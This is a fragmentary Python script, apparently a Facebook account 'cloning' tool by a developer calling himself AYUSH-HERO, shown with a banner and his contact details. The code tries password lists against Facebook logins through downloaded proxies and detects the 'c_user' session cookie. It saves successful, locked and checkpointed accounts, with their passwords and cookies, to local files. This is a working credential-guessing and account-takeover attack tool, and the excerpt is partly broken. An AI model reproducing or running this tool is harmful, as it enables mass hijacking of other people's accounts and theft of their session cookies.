...
"""
#===--------------------------[-------]--------------------------===#
CREATE BY AYUSH AYUSH-HERO
GITHUB : AYUSH-HERO
FACEBOOK : AYUSH 1NX1D3
Whatapp : +977 9822881103
#===--------------------------[-------]--------------------------===#
"""
...
try:
	os.mkdir('/sdcard/AYUSH')
except:
	pass
if os.path.exists("/sdcard/AYUSH"):
	pass
else:
...
|/     \|   \_/   (_______)\_______)|/     \|
{40*'-'}
{P}Facebook : AYUSH 1NX1D3
{P}Github   : AYUSH-HERO
{P}Version  : 3.5
{P}Tools    : RANDOM X FILE CLONING
{40*'-'}""")
...
try:,
	prox= requests.get('https://raw.githubusercontent.com/AYUSH-HERO/Server/main/proxy.txt').text
...
def nrmlrm(id,psd,tid,xrl):
	...
	sys.stdout.write(f'\r\r[AYUSH-XD] %s|OK:-{G}%s{W}|{S}%s{W}|{R}%s{W}   '%(lop,len(ok),len(lk),len(cp)));sys.stdout.flush()
	try:
		for psw in psd:
...
response = requests.get(
    ...
    'viewport-width': '980',}
			...
			if 'c_user' in lcki:
				...
				if 'Locked' in check:
					print(f"\r\r\x1b[38;5;28m[AYUSH-LK] {iid} | {psw}\x1b[1;97m")
					lk.append(id)
					open('/sdcard/AYUSH/AYUSH-R-H-LOCK.txt', 'a').write(iid+'|'+psw+'|'+coki+"\n")
					break
				else:
					print(f"\r\r\x1b[1;92m[AYUSH-OK] {iid} | {psw}\x1b[0m")
					print(f"\r\r\x1b[1;92m[COOKIE] "+coki+"\n")
					ok.append(id)
					open('/sdcard/AYUSH/AYUSH-R-H-OK.txt', 'a').write(iid+'|'+psw+'|'+coki+"\n")
					break
				break
				...
				try:
					...
					iid=id
				cp.append(id)
				open('/sdcard/AYUSH/R-CP.txt', 'a').write(iid+'|'+psw+"\n")
				break
			else:
				continue
		lop+=1
